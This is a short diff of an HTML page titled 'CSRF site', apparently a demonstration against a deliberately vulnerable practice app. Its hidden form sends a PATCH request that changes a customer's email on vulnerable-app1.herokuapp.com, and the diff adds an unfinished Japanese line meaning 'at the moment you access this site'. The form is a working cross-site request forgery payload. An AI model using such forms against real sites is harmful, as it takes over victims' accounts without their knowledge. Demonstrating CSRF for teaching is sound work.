@@ -9,6 +9,8 @@
 <body>
 <h1>CSRFサイト</h1>
 
+<p>このサイトにアクセスした時点で
+
 <form action="https://vulnerable-app1.herokuapp.com/customers/4" method="post" id="csrf-form" >
   <input name="_method" type="hidden" value="patch" />
   <input type="hidden" name="customer[email]" value="top@gun" />
